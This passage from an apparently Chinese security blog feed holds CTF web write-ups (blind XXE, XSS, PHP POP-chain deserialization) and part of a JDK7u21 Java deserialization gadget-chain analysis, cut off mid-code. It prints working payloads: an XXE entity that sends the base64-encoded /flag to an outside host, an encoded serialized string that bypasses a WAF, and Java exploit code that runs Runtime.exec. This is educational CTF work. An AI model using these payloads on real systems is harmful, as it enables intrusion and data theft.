class="line"></span><br></pre></td></tr></table></figure><br>其在爆破前会先队当前时间戳mod20来与x的长度加1进行比较确保每次爆破都是多加一个字符</p><h1 id="看不到啊啊啊啊"><a href="#看不到啊啊啊啊" class="headerlink" title="看不到啊啊啊啊"></a>看不到啊啊啊啊</h1><p>无回显的xxe，其会解析上传的xml<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://1.94.xxx.xxx:8000?p=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://1.94.xxx.xxx:8000/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><h1 id="Wells求职记"><a href="#Wells求职记" class="headerlink" title="Wells求职记"></a>Wells求职记</h1><p>考xss，写这题时要先了解一些<code>&#123;&#123;&#123;&#125;&#125;&#125;</code>的意思，这个意思就是在模板传入时不进行html实体化编码，这时候就会产生xss<br><img src="/2025/05/02/FCTF/IMG_20250506-141722102.png" class=""><br><img src="/2025/05/02/FCTF/IMG_20250506-141738317.png" class=""><br>我们可以看到有两处地方使用了<code>&#123;&#123;&#123;&#125;&#125;&#125;</code>但是我们看代码<br><img src="/2025/05/02/FCTF/IMG_20250506-141855224.png" class=""><br>user.resume经过renderResume处理了一下<br><img src="/2025/05/02/FCTF/IMG_20250506-142038175.png" class=""><br>我们可以看到其返回值是经过purify.sanitize处理后的data然后拼接上<code>&lt;iframe src=&quot;/resumeFile/&#39; +req.user.username + &#39;&quot; style=&quot;width: 100%;height: 500px;&quot;&gt;&lt;/iframe&gt;&gt;</code></p><p>然后因为用户名又无法出现特殊字符所有xss点应该是另一个。看一下</p><p>user.resumeFile我们可以看到其并没做什么处理<br><img src="/2025/05/02/FCTF/IMG_20250506-142504879.png" class=""><br>也就是我们可以在文件名动手打xss。但是这个无法使用/所以我们使用<code>&lt;img src=x onerror=alert(123)&gt;</code><br><img src="/2025/05/02/FCTF/IMG_20250506-142728243.png" class=""><br>这个页面可以在/resumeFile/xxx访问到。<br><img src="/2025/05/02/FCTF/IMG_20250506-142951493.png" class=""><br>虽然我们只能让bot访问resume但是我们前面分析了resume是会加上<code>&lt;iframe&gt;</code>导入resumeFile的所以直接访问resume/xxx就会xss</p><h1 id="baby-pop"><a href="#baby-pop" class="headerlink" title="baby_pop"></a>baby_pop</h1><img src="/2025/05/02/FCTF/IMG_20250506-143608617.png" class="">  <p>看代码其echo了obj的内容<br>那么我们触发tostring<br><img src="/2025/05/02/FCTF/IMG_20250506-143644197.png" class=""><br>那么链头应该是ROIS<br><img src="/2025/05/02/FCTF/IMG_20250506-143707946.png" class=""><br>我们看一下PowerfulCall的<code>__call</code>其会调用到任意类的任意方法参数也可控<br>preloadInclude的preload会读取文件夹文件名然后每个都包含<br>那么链子就很明确了<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROIS&#123;__toString&#125;-&gt;PowerfulCall&#123;__call&#125;-&gt;preloadInclude&#123;preload&#125;</span><br></pre></td></tr></table></figure><br>看一下waf可以发现其<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blacklists</span> = [<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;:\/\/&quot;</span>,<span class="string">&quot;\.\.\/&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkIsSafe</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;blacklists <span class="keyword">as</span> <span class="variable">$blacklist</span>)&#123;</span><br><span class="line">            <span class="variable">$pattern</span> = <span class="string">&quot;/&quot;</span>.<span class="variable">$blacklist</span>.<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;logs/&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>).<span class="string">&quot;.logs&quot;</span>,<span class="variable">$blacklist</span>.<span class="string">&quot; is not allowed to be unserialized!\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>检测eval和../和//检测到就写到logs里。<br>而这题需要命令执行<br>所以我们要找一个可以可控写文件的地方<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Utils</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public static function ser($obj)</span><br><span class="line">    &#123;</span><br><span class="line">        return serialize($obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function unser($str)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">            $obj = unserialize($str);</span><br><span class="line">            if (!$obj)&#123;</span><br><span class="line">                $e = &quot;Failed to unserialize string:         &quot;.$str.&quot;        &quot;.date(&#x27;Y-m-d H:i:s&#x27;).&quot;\n&quot;;</span><br><span class="line">                file_put_contents(&quot;logs/&quot;.date(&#x27;Y-m-d&#x27;).&quot;.logs&quot;,$e,FILE_APPEND);</span><br><span class="line">                throw new Exception($e);</span><br><span class="line">            &#125;</span><br><span class="line">            return $obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Utils里的unser方法会将反序列化失败的写logs文件夹里<br>那么我们可以在logs里写给马然后反序列化，最后的文件夹为logs，这样就可以命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$pre = new preloadInclude();</span><br><span class="line">$pre-&gt;preload(&quot;./&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class PowerfulCall</span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line"></span><br><span class="line">    public function __construct($a,$b)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method=$b;</span><br><span class="line">        $this-&gt;args=$a;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($method,$arg)</span><br><span class="line">    &#123;</span><br><span class="line">        $classname = $this-&gt;args[0];</span><br><span class="line">        $methodname = $this-&gt;method;</span><br><span class="line">        $o = new $classname();</span><br><span class="line">        return $o-&gt;$methodname($this-&gt;args[1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class preloadInclude</span><br><span class="line">&#123;</span><br><span class="line">    public function preload($path)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $files = scandir($path);</span><br><span class="line">        foreach ($files as $file)&#123;</span><br><span class="line">            $filepath = &quot;./&quot;.$path.&quot;/&quot;.$file;</span><br><span class="line">            if (is_file($filepath) &amp;&amp; basename($filepath) !== &quot;index.php&quot;)</span><br><span class="line">                include $filepath;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new ROIS();</span><br><span class="line">$a-&gt;members=array(new PowerfulCall(array(&quot;preloadInclude&quot;,&quot;logs&quot;),&quot;preload&quot;));</span><br><span class="line">$b=urlencode(serialize($a));</span><br><span class="line">echo $b;</span><br><span class="line">utils::unser(urldecode($b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="cute-pop"><a href="#cute-pop" class="headerlink" title="cute_pop"></a>cute_pop</h1><p>这题和上一题很像，至少waf多了个preload写入logs里多了个htmlspecialchars</p><p>waf好绕可以直接使用大写S+16进制来绕<br>而这个命令执行我们没法写道log里了，但是可以使用/tmp下的临时文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$pre</span> = <span class="keyword">new</span> <span class="title function_ invoke__">preloadInclude</span>();</span><br><span class="line"><span class="variable">$pre</span>-&gt;<span class="title function_ invoke__">preload</span>(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PowerfulCall</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method=<span class="variable">$b</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args=<span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$classname</span> = <span class="variable language_">$this</span>-&gt;args[<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$methodname</span> = <span class="variable language_">$this</span>-&gt;method;</span><br><span class="line">        <span class="variable">$o</span> = <span class="keyword">new</span> <span class="variable">$classname</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$o</span>-&gt;<span class="variable">$methodname</span>(<span class="variable language_">$this</span>-&gt;args[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preloadInclude</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">preload</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="string">&quot;./&quot;</span>.<span class="variable">$path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$filepath</span>) &amp;&amp; <span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>) !== <span class="string">&quot;index.php&quot;</span>)</span><br><span class="line">                <span class="keyword">include</span> <span class="variable">$filepath</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ROIS</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;members=<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">PowerfulCall</span>(<span class="keyword">array</span>(<span class="string">&quot;preloadInclude&quot;</span>,<span class="string">&quot;../../../../../tmp&quot;</span>),<span class="string">&quot;preload&quot;</span>));</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;O%3A4%3A%22ROIS%22%3A1%3A%7Bs%3A7%3A%22members%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22PowerfulCall%22%3A2%3A%7Bs%3A20%3A%22%00PowerfulCall%00method%22%3BS%3A7%3A%22\70reload%22%3Bs%3A18%3A%22%00PowerfulCall%00args%22%3Ba%3A2%3A%7Bi%3A0%3BS%3A14%3A%22\70reloadInclude%22%3Bi%3A1%3BS%3A18%3A%22..\2F..\2F..\2F..\2F..\2F..\2F%22%3B%7D%7D%7D%7D&#x27;</span>;</span><br><span class="line">utils::<span class="title function_ invoke__">unser</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22ROIS%22%3A1%3A%7Bs%3A7%3A%22members%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22PowerfulCall%22%3A2%3A%7Bs%3A20%3A%22%00PowerfulCall%00method%22%3BS%3A7%3A%22\70reload%22%3Bs%3A18%3A%22%00PowerfulCall%00args%22%3Ba%3A2%3A%7Bi%3A0%3BS%3A14%3A%22\70reloadInclude%22%3Bi%3A1%3BS%3A18%3A%22..\2F..\2F..\2F..\2F..\2F..\2F%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p>payload如上<br><img src="/2025/05/02/FCTF/IMG_20250506-144916021.png" class=""><br>条件竞争起来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写点有意思的题目吧&quot;&gt;&lt;a href=&quot;#写点有意思的题目吧&quot; class=&quot;headerlink&quot; title=&quot;写点有意思的题目吧&quot;&gt;&lt;/a&gt;写点有意思的题目吧&lt;/h1&gt;&lt;h1 id=&quot;ez-time&quot;&gt;&lt;a href=&quot;#ez-time&quot; class=&quot;he</summary>
      
    
    
    
    <category term="java" scheme="https://lisien11.xyz/categories/java/"/>
    
    
    <category term="java" scheme="https://lisien11.xyz/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JDK7u21</title>
    <link href="https://lisien11.xyz/2025/04/28/JDK7u21/"/>
    <id>https://lisien11.xyz/2025/04/28/JDK7u21/</id>
    <published>2025-04-28T06:33:01.000Z</published>
    <updated>2025-05-06T10:29:08.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h1><p>我们都知道在java反序列化中最重要的是找到应该类方法的动态调用，如cc中的各种transforme，TemplatesImpl的字节码加载<br>而JDK7u21的命令执行点就是在AnnotationInvocationHandler。AnnotationInvocationHandler是一个代理类，而其有一个equalsImpl方法<br>其存在一个反射调用。<br><img src="/2025/04/28/JDK7u21/IMG_20250429-160631315.png" class=""><br>我们可以发现其memberMethod是遍历了getMemberMethods()。<br><img src="/2025/04/28/JDK7u21/IMG_20250429-161955304.png" class=""><br>而getMemberMethods的返回值其实是type.getDeclaredMethods();而type我们可控，那么我们只要传入TemplatesImpl的接口Templates就可以调用到newTransformer了<br><img src="/2025/04/28/JDK7u21/IMG_20250429-162149236.png" class=""><br>不可以直接传入type为TemplatesImpl.class这是因为在遍历方法时第一个遍历的是writeObject，直接抛异常退出了</p><p>但是其是一个私有类所以我们要找一下哪里调用了<br><img src="/2025/04/28/JDK7u21/IMG_20250429-160736926.png" class=""><br>而在其重写的invoke只要当member.equals(“equals”)时就可以调用到equalsImpl，且参数equals的参数。<br>而我们想要调用到invoke就需要使用动态代理了</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>简单讲一下动态代理，动态代理需要三个东西，接口，完成接口的类，以及完成了InvocationHandler接口的类（下面简称Handler）<br>而我们的Handler是需要王朝invoke接口的，这个接口在代理类每次调用方法时都会走到。<br><img src="/2025/04/28/JDK7u21/IMG_20250429-161515189.png" class=""><br>invoke的三个参数就是代理类，调用的方法，参数。</p><h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><p>上面说到只要调用的方法名为equals就可以调用到equalsImpl。那么有<code>proxy.equals(tpl)</code>就可以命令执行了<br>简单测试一下命令执行<br><img src="/2025/04/28/JDK7u21/IMG_20250429-164159137.png" class="">  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getTemplates</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        CtClass code=pool.makeClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        code.makeClassInitializer().insertBefore(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        code.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line"></span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl tpl=(TemplatesImpl) getTemplates();</span><br><span class="line">        HashMap map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler Annotation=(InvocationHandler)constructor.newInstance(Templates.class,map);</span><br><span class="line">        Templates proxy=(Templates) Proxy.newProxyInstance(tpl.getClass().getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,Annotation);</span><br><span class="line">        proxy.equals(tpl);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>OK弹出了计算机，那么下面就找会调用到equals的类了。这条链子用的是Hashset这个类</p><h1 id="Hashset"><a href="#Hashset" class="headerlink" title="Hashset"></a>Hashset</h1><p>Hashset的主要作用是去重，其实也就是利用hashMao的key不能相等来进行去除<br><img src="/2025/04/28/JDK7u21/IMG_20250429-164921781.png" class=""><br>我们看Hashset的readObject可以发现其调用了map.put看一下put<br><img src="/2025/04/28/JDK7u21/IMG_20250429-170350506.png" class=""><br>可以发现当新加入的key会和map里的其他key进行比较当hash值相同时就会调用到key.equaks(k)<br>看一下hash的逻辑<br><img src="/2025/04/28/JDK7u21/IMG_20250429-171019497.png" class=""><br>可以发现其实就是调用了hashCode，我们所涉及的key其实就TemplatesImpl和proxy类。TemplatesImpl的hashCode是固定了，但是proxy.hashCode会调用到AnnotationInvocationHandler的hashCodeImpl<br><img src="/2025/04/28/JDK7u21/IMG_20250429-171350060.png" class=""><br>可以发现其是值是我们传入AnnotationInvocationHandler实例的map中的key的hashCode异或上value的hashcode值，那么我们只要使其前面的key的hashcode为0value为TemplatesImpl不久可以得到TemplatesImpl的hashCode值了吗？</p><p>爆破得到的值为f5a5a608。<br>那么我们久可以开始编写我们的exp了</p><p>相比起上面的poc我们只要加上一个HashSet添加上proxy和TemplatesImpl即可如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 